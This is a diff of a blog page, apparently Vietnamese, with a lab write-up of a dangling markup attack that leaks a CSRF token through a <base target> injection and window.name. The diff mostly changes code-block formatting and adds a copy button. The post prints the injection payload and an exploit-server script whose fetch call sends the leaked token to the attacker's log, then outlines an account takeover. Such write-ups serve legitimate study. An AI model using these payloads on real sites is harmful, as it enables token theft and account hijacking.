@@ -153,19 +153,10 @@ tag: Dangling Markup Attack</h2>
 </li>
 <li>Dữ liệu nhạy cảm: token chống CSRF nằm ngay sau điểm injection <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1vqJGKUWe.png"></li>
 </ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;form action=&#34;/my-account/change-email&#34; method=&#34;POST&#34;&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;form action=&#34;/my-account/change-email&#34; method=&#34;POST&#34;&gt;
 </span></span><span class="line"><span class="cl">    &lt;input type=&#34;text&#34; name=&#34;email&#34; value=&#34;&#34;&gt; &lt;!-- injection ở đây --&gt;
 </span></span><span class="line"><span class="cl">    &lt;input required type=&#34;hidden&#34; name=&#34;csrf&#34; value=&#34;SECRET_TOKEN&#34;&gt; &lt;!-- Mục tiêu --&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>=&gt; Ta cần nuốt toàn bộ đoạn mã từ sau thẻ email đến hết thẻ csrf token</p>
+</span></span></code></pre></div><p>=&gt; Ta cần nuốt toàn bộ đoạn mã từ sau thẻ email đến hết thẻ csrf token</p>
 <h1 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h1>
 <ul>
 <li>Do <code>img-src</code> bị chặn, ta sẽ sử dụng kỹ thuật Dangling Markup qua thẻ <code>&lt;base&gt;</code> kết hợp với <code>window.name</code></li>
@@ -174,15 +165,8 @@ tag: Dangling Markup Attack</h2>
 <ul>
 <li>Mục tiêu là chèn một thẻ <code>&lt;base target='</code>. Thuộc tính <code>target</code> quy định tên của cửa sổ (<code>window name</code>) khi người dùng nhấn vào <code>link</code>. Nếu ta không đóng ngoặc toàn bộ nội dung HTML phía sau sẽ trở thành tên của cửa sổ mới</li>
 </ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;&gt;&lt;a href=&#34;[https://exploit_server.net/exploit](https://exploit_server.net/exploit)&#34;&gt;Click Me&lt;/a&gt;&lt;base target=&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;&gt;&lt;a href=&#34;[https://exploit_server.net/exploit](https://exploit_server.net/exploit)&#34;&gt;Click Me&lt;/a&gt;&lt;base target=&#34;
+</span></span></code></pre></div><ul>
 <li><code>&quot;&gt;</code>: đóng thẻ <code>&lt;input&gt;</code> và thuộc tính <code>value</code> hiện tại của victim để thoát ra ngoài</li>
 <li><code>&lt;a href=&quot;...&quot;&gt;Click Me&lt;/a&gt;</code>: tTạo mồi nhử, vì ta không thể dùng script để tự động chuyển trang hay dùng ảnh để tự động tải, ta cần người dùng tương tác (click).</li>
 <li><code>&lt;base target=&quot;</code>: bắt đầu tấn công Dangling. Dấu ngoặc kép mở sẽ nuốt mọi thứ phía sau cho đến khi gặp dấu ngoặc kép tiếp theo trong trang web gốc</li>
@@ -198,25 +182,13 @@ tag: Dangling Markup Attack</h2>
 <p>Browser sẽ hiểu DOM như sau:</p>
 </li>
 </ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    &lt;input ... value=&#34;&#34;&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    &lt;input ... value=&#34;&#34;&gt;
 </span></span><span class="line"><span class="cl">    &lt;a href=&#34;[https://exploit_server.net/exploit](https://exploit_server.net/exploit)&#34;&gt;Click Me&lt;/a&gt;
 </span></span><span class="line"><span class="cl">    &lt;base target=&#34;&gt;
 </span></span><span class="line"><span class="cl">        &lt;input required type=&#39;hidden&#39; name=&#39;csrf&#39; value=&#39;TOKEN&#39;&gt;
 </span></span><span class="line"><span class="cl">        &lt;button ...&gt; ... &lt;/form&gt; ...
 </span></span><span class="line"><span class="cl">    &#34;&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
+</span></span></code></pre></div><ul>
 <li>Toàn bộ đoạn mã từ <code>&gt; &lt;input ... value='</code> trở thành giá trị của thuộc tính <code>target</code></li>
 <li>Giá trị này chứa <code>TOKEN</code></li>
 </ul>
@@ -231,27 +203,14 @@ tag: Dangling Markup Attack</h2>
 </li>
 </ul>
 <p>Code tại exploit server (File<code>/exploit</code>)</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
 </span></span><span class="line"><span class="cl">&lt;script&gt;
 </span></span><span class="line"><span class="cl">    // window.name chứa CSRF token bị rò rỉ
 </span></span><span class="line"><span class="cl">    // Gửi nó về log của attacker
 </span></span><span class="line"><span class="cl">    fetch(&#39;/log?leak=&#39; + encodeURIComponent(window.name));
 </span></span><span class="line"><span class="cl">&lt;/script&gt;
 </span></span><span class="line"><span class="cl">&lt;/body&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="account-takeover">Account takeover<a hidden class="anchor" aria-hidden="true" href="#account-takeover">#</a></h2>
+</span></span></code></pre></div><h2 id="account-takeover">Account takeover<a hidden class="anchor" aria-hidden="true" href="#account-takeover">#</a></h2>
 <ul>
 <li>Lấy token: kiểm tra Access Log của exploit server, giải mã URL để tìm chuỗi <code>name='csrf' value='victim_token'</code></li>
 <li>Tạo CSRF Exploit: Sau khi có token, kẻ tấn công tạo một trang web độc hại thứ hai (hoặc sửa lại trang exploit cũ) để tự động đổi email của nạn nhân</li>
@@ -283,6 +242,7 @@ tag: Dangling Markup Attack</h2>
 </a><div id="three-container" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -9999; background: #000;"></div>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
+    
     let scene, camera, renderer, networkGroup;
     let mouseX = 0, mouseY = 0;
     const container = document.getElementById('three-container');
@@ -358,7 +318,7 @@ tag: Dangling Markup Attack</h2>
 
 
 <div id="cyber-back-btn" style="display: none;" onclick="goBack()">
-    <span class="cmd">&lt;</span> <span class="text">RETURN</span>
+    <span class="cmd">&lt; cd ..</span> <span class="text">/ RETURN</span>
 </div>
 
 <div id="hackmd-toc-wrapper" style="display: none;">
@@ -367,34 +327,26 @@ tag: Dangling Markup Attack</h2>
 </div>
 
 <script>
-    
     function goBack() {
-        
         if (window.history.length > 1 && document.referrer.indexOf(window.location.host) !== -1) {
             window.history.back();
-        } else {
-            window.location.href = '/'; 
-        }
+        } else { window.location.href = '/'; }
     }
 
-    
     function generateHackMDTOC() {
         const tocWrapper = document.getElementById('hackmd-toc-wrapper');
         const tocContent = document.getElementById('hackmd-toc-content');
         const backBtn = document.getElementById('cyber-back-btn');
         const postContent = document.querySelector('.post-content');
 
-        
         if(tocContent) tocContent.innerHTML = '';
         if(tocWrapper) tocWrapper.style.display = 'none';
         if(backBtn) backBtn.style.display = 'none';
 
-        
         if (postContent && tocContent) {
             
-            if(backBtn) backBtn.style.display = 'block';
+            backBtn.style.display = 'block';
 
-            
             const headings = postContent.querySelectorAll('h1, h2, h3, h4');
             if (headings.length > 0) {
                 tocWrapper.style.display = 'block';
@@ -453,79 +405,151 @@ tag: Dangling Markup Attack</h2>
 
 <style>
      
-    #cyber-back-btn {
-        position: fixed;
-        left: 20px;
-        top: 130px;  
-        width: 260px;  
-        padding: 10px 15px;
-        box-sizing: border-box;
-        
-        background: rgba(0, 0, 0, 0.8);
-        border: 1px solid #00ff41;
-        border-left: 5px solid #00ff41;  
-        color: #00ff41;
-        
-        font-family: 'Courier New', monospace;
-        font-weight: bold;
-        font-size: 14px;
-        cursor: pointer;
-        z-index: 95;
-        transition: all 0.3s ease;
-        backdrop-filter: blur(5px);
-        
-        text-transform: uppercase;
-        letter-spacing: 1px;
-    }
-
-    #cyber-back-btn:hover {
-        background: rgba(0, 255, 65, 0.2);
-        box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
-        padding-left: 25px;  
-    }
-    
-    #cyber-back-btn .cmd { opacity: 0.7; margin-right: 5px; }
-
-     
-    #hackmd-toc-wrapper {
-        position: fixed;
-        left: 20px;
-        top: 180px;  
-        width: 260px;
-        max-height: calc(100vh - 200px);
-        overflow-y: auto;
-        z-index: 90;
-        background: transparent;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-        padding-right: 10px;
-    }
-
-    .toc-header {
-        font-family: 'Courier New', monospace;
-        font-size: 11px; font-weight: bold; color: #00ff41;
-        margin-bottom: 15px; border-bottom: 1px solid rgba(0, 255, 65, 0.3);
-        padding-bottom: 5px; opacity: 0.8;
-    }
+    #cyber-back-btn { position: fixed; left: 20px; top: 130px; width: 260px; padding: 10px 15px; box-sizing: border-box; background: rgba(0, 0, 0, 0.8); border: 1px solid #00ff41; border-left: 5px solid #00ff41; color: #00ff41; font-family: 'Courier New', monospace; font-weight: bold; font-size: 14px; cursor: pointer; z-index: 95; transition: all 0.3s ease; backdrop-filter: blur(5px); text-transform: uppercase; letter-spacing: 1px; }
+    #cyber-back-btn:hover { background: rgba(0, 255, 65, 0.2); box-shadow: 0 0 15px rgba(0, 255, 65, 0.4); padding-left: 25px; }
+    #hackmd-toc-wrapper { position: fixed; left: 20px; top: 180px; width: 260px; max-height: calc(100vh - 200px); overflow-y: auto; z-index: 90; background: transparent; padding-right: 10px; }
+    .toc-header { font-family: 'Courier New', monospace; font-size: 11px; font-weight: bold; color: #00ff41; margin-bottom: 15px; border-bottom: 1px solid rgba(0, 255, 65, 0.3); padding-bottom: 5px; opacity: 0.8; }
     #hackmd-toc-content ul { list-style: none; padding: 0; margin: 0; border-left: 2px solid rgba(255, 255, 255, 0.1); }
     #hackmd-toc-content li { margin: 0; position: relative; }
     .toc-link { display: block; text-decoration: none; color: #888; font-size: 13px; padding: 5px 0 5px 15px; line-height: 1.5; transition: all 0.2s ease; border-left: 2px solid transparent; margin-left: -2px; }
     .toc-link:hover { color: #fff; }
     .toc-link.active { color: #00ff41 !important; font-weight: 500; border-left: 2px solid #00ff41; background: linear-gradient(90deg, rgba(0, 255, 65, 0.05), transparent); }
     .toc-item.h1 { padding-left: 0; } .toc-item.h1 .toc-link { font-weight: bold; font-size: 14px; color: #ccc; }
-    .toc-item.h2 { padding-left: 0; }
-    .toc-item.h3 .toc-link { padding-left: 30px; font-size: 12px; }
-    .toc-item.h4 .toc-link { padding-left: 45px; font-size: 11px; opacity: 0.8; }
-    #hackmd-toc-wrapper::-webkit-scrollbar { width: 3px; }
-    #hackmd-toc-wrapper::-webkit-scrollbar-thumb { background: #333; }
+    .toc-item.h2 { padding-left: 0; } .toc-item.h3 .toc-link { padding-left: 30px; font-size: 12px; } .toc-item.h4 .toc-link { padding-left: 45px; font-size: 11px; opacity: 0.8; }
+    #hackmd-toc-wrapper::-webkit-scrollbar { width: 3px; } #hackmd-toc-wrapper::-webkit-scrollbar-thumb { background: #333; }
+    @media screen and (max-width: 1450px) { #hackmd-toc-wrapper, #cyber-back-btn { display: none !important; } }
+</style>
+
+
+<script>
+    
+    function initCodeCopy() {
+        
+        const codeBlocks = document.querySelectorAll('.highlight');
+
+        codeBlocks.forEach(block => {
+            
+            if (block.querySelector('.cyber-copy-btn')) return;
+
+            
+            if (getComputedStyle(block).position === 'static') {
+                block.style.position = 'relative';
+            }
+
+            
+            const btn = document.createElement('button');
+            btn.className = 'cyber-copy-btn';
+            btn.innerHTML = '<span>COPY</span>'; 
+            
+            
+            btn.addEventListener('click', () => {
+                
+                const clone = block.cloneNode(true);
+                
+                
+                const lineNums = clone.querySelectorAll('.ln, .lnt, .lntd:first-child');
+                lineNums.forEach(el => el.remove());
+                
+                
+                const codeText = clone.innerText.trim();
+
+                navigator.clipboard.writeText(codeText).then(() => {
+                    btn.innerHTML = '<span style="color:#fff">COPIED!</span>';
+                    btn.classList.add('copied');
+                    setTimeout(() => {
+                        btn.innerHTML = '<span>COPY</span>';
+                        btn.classList.remove('copied');
+                    }, 2000);
+                });
+            });
+
+            block.appendChild(btn);
+        });
+    }
+</script>
+
+<style>
+     
+     
+    .ln, .lnt, .lntd:first-child { 
+        display: none !important; 
+        width: 0 !important;
+        padding: 0 !important;
+        user-select: none;
+    }
+    
+     
+    .lntd:last-child { 
+        width: 100% !important; 
+        padding-left: 0 !important;
+    }
+    
+     
+    .lntable { 
+        width: 100% !important; 
+        display: block !important; 
+    }
+    .lntable tbody, .lntable tr, .lntable td { 
+        display: block !important; 
+        width: 100% !important; 
+    }
 
      
-    @media screen and (max-width: 1450px) {
-        #hackmd-toc-wrapper, #cyber-back-btn { display: none !important; }
+    .cyber-copy-btn {
+        position: absolute;
+        top: 0;
+        right: 0;
+        z-index: 10;
+        background: rgba(0, 255, 65, 0.1);
+        border: none;
+        border-bottom-left-radius: 5px;
+        border-left: 1px solid #00ff41;
+        border-bottom: 1px solid #00ff41;
+        color: #00ff41;
+        font-family: 'Courier New', monospace;
+        font-size: 11px;
+        font-weight: bold;
+        padding: 5px 10px;
+        cursor: pointer;
+        opacity: 0;  
+        transition: all 0.3s ease;
     }
+
+     
+    .highlight:hover .cyber-copy-btn {
+        opacity: 1;
+    }
+
+    .cyber-copy-btn:hover {
+        background: #00ff41;
+        color: #000;
+    }
+
+     
+    .post-content .highlight {
+        background: #0d1117 !important;  
+        border: 1px solid rgba(0, 255, 65, 0.3);
+        border-radius: 6px;
+        margin-bottom: 20px;
+        overflow: hidden;  
+    }
+    
+    .post-content pre {
+        padding: 15px !important;
+        margin: 0 !important;
+        background: transparent !important;
+        overflow-x: auto;  
+    }
+
+     
+    .post-content pre::-webkit-scrollbar { height: 6px; }
+    .post-content pre::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 3px; }
+    .post-content pre::-webkit-scrollbar-track { background: #1a1a1a; }
 </style>
 
 
 <style>
+     
     .post-single {
         background-color: rgba(0, 0, 0, 0.85) !important;
         backdrop-filter: blur(10px);
@@ -538,17 +562,14 @@ tag: Dangling Markup Attack</h2>
         z-index: 1;
     }
     @media screen and (min-width: 1451px) {
-        .post-single {
-            margin-left: 300px !important;
-            width: calc(100% - 300px) !important;
-            max-width: 1000px;
-        }
+        .post-single { margin-left: 300px !important; width: calc(100% - 300px) !important; max-width: 1000px; }
         .main { max-width: 1600px !important; margin: auto; }
     }
-    .post-content { color: #e0e0e0; }
-    .post-content pre { border: 1px solid rgba(0, 255, 65, 0.4); background: #0d1117 !important; }
+    .post-content { color: #e0e0e0; font-family: 'Segoe UI', sans-serif; }
+    .profile img { border-radius: 50% !important; border: 3px solid #00ff41 !important; box-shadow: 0 0 25px rgba(0, 255, 65, 0.4) !important; background: #000; transition: transform 0.3s ease; }
+    .profile img:hover { transform: scale(1.05) rotate(5deg); box-shadow: 0 0 50px rgba(0, 255, 65, 0.9) !important; }
+    .art-widget, .cyber-panel, .avatar-wrapper-hud { display: none !important; }
 </style>
-
 
 <script>
     function initStatusBar() {
@@ -557,12 +578,7 @@ tag: Dangling Markup Attack</h2>
         if (header) {
             const statusBar = document.createElement('div');
             statusBar.id = 'system-status-bar';
-            statusBar.innerHTML = `
-                <div class="status-content">
-                    <div class="status-item"><span class="label">SYSTEM:</span> <span class="value">ONLINE</span></div>
-                    <div class="status-clock"><span id="sb-hour">00</span><span class="blink">:</span><span id="sb-min">00</span><span class="blink">:</span><span id="sb-sec">00</span></div>
-                    <div class="status-item"><span class="label">DATE:</span> <span class="value" id="sb-date">LOADING...</span></div>
-                </div>`;
+            statusBar.innerHTML = `<div class="status-content"><div class="status-item"><span class="label">SYSTEM:</span> <span class="value">ONLINE</span></div><div class="status-clock"><span id="sb-hour">00</span><span class="blink">:</span><span id="sb-min">00</span><span class="blink">:</span><span id="sb-sec">00</span></div><div class="status-item"><span class="label">DATE:</span> <span class="value" id="sb-date">LOADING...</span></div></div>`;
             header.parentNode.insertBefore(statusBar, header.nextSibling);
             function updateTime() {
                 const now = new Date();
@@ -584,21 +600,17 @@ tag: Dangling Markup Attack</h2>
 </style>
 
 
-<style>
-    .profile img { border-radius: 50% !important; border: 3px solid #00ff41 !important; box-shadow: 0 0 25px rgba(0, 255, 65, 0.4) !important; background: #000; transition: transform 0.3s ease; }
-    .profile img:hover { transform: scale(1.05) rotate(5deg); box-shadow: 0 0 50px rgba(0, 255, 65, 0.9) !important; }
-    .art-widget, .cyber-panel, .avatar-wrapper-hud { display: none !important; }
-</style>
-
 <script src="https://cdn.jsdelivr.net/npm/pjax/pjax.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
 <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
 <div id="aplayer-fixed"></div>
 
 <script>
+    
     function initAllWidgets() {
         initStatusBar();
         generateHackMDTOC();
+        initCodeCopy(); 
     }
 
     document.addEventListener('DOMContentLoaded', () => {
